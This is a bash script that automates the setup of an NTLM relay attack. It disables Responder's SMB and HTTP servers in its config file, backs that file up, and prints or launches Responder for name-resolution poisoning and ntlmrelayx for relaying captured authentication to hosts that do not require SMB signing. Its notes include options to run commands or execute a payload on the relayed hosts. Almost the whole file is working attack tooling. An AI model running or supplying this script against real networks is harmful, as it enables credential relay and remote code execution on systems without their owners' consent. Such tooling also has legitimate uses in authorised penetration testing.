#!/usr/bin/env bash
#
# ntlm-relay-setup.sh
#
# Prepare an NTLM relay: turn off Responder's own SMB/HTTP servers (they must be
# off so ntlmrelayx can bind them), back up the config, and print the exact
# Responder and ntlmrelayx commands to run in two terminals. Can optionally
# launch one of them. --restore puts Responder.conf back.
#
# Usage:
#   sudo ./ntlm-relay-setup.sh --iface eth0 --targets targets.txt
#   sudo ./ntlm-relay-setup.sh --iface eth0 --targets targets.txt --launch relay
#   sudo ./ntlm-relay-setup.sh --restore
#   ./ntlm-relay-setup.sh --iface eth0 --targets t.txt --dry-run
#
# Relaying only works against hosts with SMB signing NOT required. Get that list
# with: nmap --script smb2-security-mode -p445 <subnet>  (or crackmapexec).
#
set -uo pipefail

CONF="/etc/responder/Responder.conf"
BACKUP="/var/lib/parrot-scripts/Responder.conf.bak"

IFACE=""
TARGETS=""
LAUNCH=""
RESTORE=0
DRY_RUN=0

die()  { echo "ERROR: $*" >&2; exit 1; }
have() { command -v "$1" >/dev/null 2>&1; }

usage() {
  grep '^#' "$0" | sed 's/^# \{0,1\}//' | sed '/^!/d'
  exit "${1:-0}"
}

run() {
  if [ "$DRY_RUN" -eq 1 ]; then echo "   [dry-run] $*"; return 0; fi
  "$@"
}

# ntlmrelayx may be installed under either name.
relay_bin() {
  if have impacket-ntlmrelayx; then echo "impacket-ntlmrelayx";
  elif have ntlmrelayx.py; then echo "ntlmrelayx.py";
  elif have ntlmrelayx; then echo "ntlmrelayx";
  else return 1; fi
}

# --- parse args -----------------------------------------------------------
while [ $# -gt 0 ]; do
  case "$1" in
    -h|--help)    usage 0 ;;
    --dry-run|-n) DRY_RUN=1 ;;
    --restore)    RESTORE=1 ;;
    --iface)      shift; [ $# -gt 0 ] || die "--iface needs a value"; IFACE="$1" ;;
    --iface=*)    IFACE="${1#*=}" ;;
    --targets)    shift; [ $# -gt 0 ] || die "--targets needs a path"; TARGETS="$1" ;;
    --targets=*)  TARGETS="${1#*=}" ;;
    --launch)     shift; [ $# -gt 0 ] || die "--launch needs relay|responder"; LAUNCH="$1" ;;
    --launch=*)   LAUNCH="${1#*=}" ;;
    *)            die "Unknown option: $1 (try --help)" ;;
  esac
  shift
done

# --- restore --------------------------------------------------------------
if [ "$RESTORE" -eq 1 ]; then
  [ "$DRY_RUN" -eq 1 ] || [ "$(id -u)" -eq 0 ] || die "--restore needs root."
  [ -f "$BACKUP" ] || die "No backup at $BACKUP; nothing to restore."
  run cp "$BACKUP" "$CONF"
  run rm -f "$BACKUP"
  echo ">> Restored $CONF from backup."
  exit 0
fi

[ -n "$IFACE" ]   || { echo "No --iface given." >&2; usage 2; }
[ -n "$TARGETS" ] || { echo "No --targets file given." >&2; usage 2; }
[ -f "$TARGETS" ] || die "Targets file not found: $TARGETS"

if ! have responder; then
  [ "$DRY_RUN" -eq 1 ] || die "responder not found (apt install responder)."
  echo ">> (dry-run) responder not installed; previewing anyway."
fi
if ! RELAY=$(relay_bin); then
  [ "$DRY_RUN" -eq 1 ] || die "ntlmrelayx not found (apt install python3-impacket)."
  RELAY="impacket-ntlmrelayx"   # placeholder for the preview
fi

if [ "$DRY_RUN" -ne 1 ] && [ "$(id -u)" -ne 0 ]; then
  die "Configuring Responder and binding 445/80 needs root. Re-run with sudo (or --dry-run)."
fi

# --- turn off Responder's SMB/HTTP so ntlmrelayx can bind them -------------
if [ -f "$CONF" ]; then
  echo ">> Backing up $CONF and disabling Responder SMB/HTTP..."
  run mkdir -p "$(dirname "$BACKUP")"
  [ -f "$BACKUP" ] || run cp "$CONF" "$BACKUP"
  if [ "$DRY_RUN" -ne 1 ]; then
    sed -i -E 's/^(SMB)[[:space:]]*=.*/\1 = Off/I; s/^(HTTP)[[:space:]]*=.*/\1 = Off/I' "$CONF"
  else
    echo "   [dry-run] sed -i set SMB = Off and HTTP = Off in $CONF"
  fi
else
  echo ">> $CONF not found; skipping config edit (check your responder install)."
fi

# --- print the plan -------------------------------------------------------
cat <<EOF

Run these in two separate terminals (both as root):

  # Terminal 1 - poison name resolution, SMB/HTTP off for relaying
  responder -I $IFACE

  # Terminal 2 - relay captured auth to the unsigned targets
  $RELAY -tf $TARGETS -smb2support -i

Notes:
  - $TARGETS must contain only hosts where SMB signing is NOT required.
  - Add -c 'COMMAND' to run a command on relay, or -e payload.exe to execute.
  - --restore (this script) puts Responder.conf back when you're done.

EOF

# --- optional launch ------------------------------------------------------
case "$LAUNCH" in
  "") ;;
  responder)
    echo ">> Launching responder on $IFACE..."
    run exec responder -I "$IFACE" ;;
  relay)
    echo ">> Launching $RELAY..."
    run exec "$RELAY" -tf "$TARGETS" -smb2support -i ;;
  *) die "--launch must be 'relay' or 'responder'." ;;
esac
